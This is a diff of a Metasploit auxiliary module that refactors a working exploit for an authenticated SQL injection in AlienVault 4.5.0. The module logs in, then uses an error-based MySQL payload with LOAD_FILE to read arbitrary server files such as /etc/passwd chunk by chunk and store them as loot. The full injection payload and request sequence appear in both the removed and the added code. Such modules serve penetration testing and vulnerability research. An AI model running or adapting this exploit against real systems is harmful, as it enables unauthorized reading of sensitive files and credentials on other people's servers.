@@ -13,9 +13,10 @@ class Metasploit4 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => "AlienVault Authenticated SQL Injection Arbitrary File Read",
       'Description'    => %q{
-      AlienVault 4.5.0 is susceptible to an authenticated SQL injection attack via a PNG
-      generation PHP file. This module exploits this to read an arbitrary file from
-      the file system. Any authed user should be usable. Admin not required.
+        AlienVault 4.5.0 is susceptible to an authenticated SQL injection attack via a PNG
+        generation PHP file. This module exploits this to read an arbitrary file from
+        the file system. Any authenticated user should be able to exploit it. Administration
+        privileges aren't required.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -23,8 +24,13 @@ class Metasploit4 < Msf::Auxiliary
           'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
         ],
       'References'     =>
-        [['EDB', '32644']
+        [
+          ['EDB', '32644']
         ],
+      'DefaultOption'  =>
+        {
+          'SSL' => true
+        },
       'Platform'       => ['linux'],
       'Privileged'     => false,
       'DisclosureDate' => "Mar 30 2014"))
@@ -32,25 +38,32 @@ class Metasploit4 < Msf::Auxiliary
       register_options(
       [
         Opt::RPORT(443),
-        OptBool.new('SSL', [true, 'Use SSL', true]),
-        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd']),
-        OptString.new('USERNAME', [ true, 'Single username', 'username']),
-        OptString.new('PASSWORD', [ true, 'Single password', 'password']),
-        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/'])
+        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),
+        OptString.new('USERNAME', [ true, 'Single username' ]),
+        OptString.new('PASSWORD', [ true, 'Single password' ]),
+        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ])
       ], self.class)
 
   end
 
   def run
+
+    print_status("#{peer} - Get a valid session cookie...")
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')
     })
 
-    if !res
-      fail_with("Server did not respond in an expected way")
+    unless res
+      print_error("#{peer} - Server did not respond in an expected way")
+      return
     end
 
     cookie = res.get_cookies
+
+    if cookie.blank?
+      print_error("#{peer} - Could not retrieve a cookie")
+      return
+    end
 
     post = {
       'embed' => '',
@@ -60,6 +73,8 @@ class Metasploit4 < Msf::Auxiliary
       'pass' => Rex::Text.encode_base64(datastore['PASSWORD'])
     }
 
+    print_status("#{peer} - Login...")
+
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),
       'method' => 'POST',
@@ -67,51 +82,30 @@ class Metasploit4 < Msf::Auxiliary
       'cookie' => cookie
     })
 
-    if !res
-      fail_with("Server did not respond in an expected way")
+    unless res
+      print_error("#{peer} - Server did not respond in an expected way")
+      return
     end
 
-    if res.headers['Location'] != normalize_uri(target_uri.path, 'ossim/')
-      fail_with('Authentication failed')
+    unless res.headers['Location'] && res.headers['Location'] == normalize_uri(target_uri.path, 'ossim/')
+      print_error("#{peer} - Authentication failed")
+      return
     end
 
     cookie = res.get_cookies
 
-    done = false
     i = 0
     full = ''
     filename = datastore['FILEPATH'].unpack("H*")[0]
     left_marker = Rex::Text.rand_text_alpha(6)
     right_marker = Rex::Text.rand_text_alpha(6)
 
-    while !done
-      pay =  "2014-02-28' AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
-      pay << "(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{filename})) AS CHAR),"
-      pay << "0x20)),#{(50*i)+1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
-      pay << " GROUP BY x)a) AND 'xnDa'='xnDa"
+    print_status("#{peer} - Exploiting SQLi...")
 
-      get = {
-        'date_from' => pay,
-        'date_to' => '2014-03-30'
-      }
-
-      res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, 'ossim', 'report', 'BusinessAndComplianceISOPCI', 'ISO27001Bar1.php'),
-        'cookie' => cookie,
-        'vars_get' => get
-      })
-
-      if !res or !res.body
-        fail_with("Server did not respond in an expected way")
-      end
-
-      file = /#{left_marker}(.*)#{right_marker}/.match(res.body)
-
-      file = file[1]
-
-      if file == ''
-        done = true
-      end
+    loop do
+      file = sqli(left_marker, right_marker, i, cookie, filename)
+      return if file.nil?
+      break if file.empty?
 
       str = [file].pack("H*")
       full << str
@@ -123,5 +117,31 @@ class Metasploit4 < Msf::Auxiliary
     path = store_loot('alienvault.file', 'text/plain', datastore['RHOST'], full, datastore['FILEPATH'])
     print_good("File stored at path: " + path)
   end
+
+  def sqli(left_marker, right_marker, i, cookie, filename)
+    pay =  "2014-02-28' AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
+    pay << "(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{filename})) AS CHAR),"
+    pay << "0x20)),#{(50*i)+1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
+    pay << " GROUP BY x)a) AND 'xnDa'='xnDa"
+
+    get = {
+      'date_from' => pay,
+      'date_to' => '2014-03-30'
+    }
+
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'ossim', 'report', 'BusinessAndComplianceISOPCI', 'ISO27001Bar1.php'),
+      'cookie' => cookie,
+      'vars_get' => get
+    })
+
+    if res and res.body and res.body =~ /#{left_marker}(.*)#{right_marker}/
+      return $1
+    else
+      print_error("Server did not respond in an expected way")
+      return nil
+    end
+  end
+
 end
 
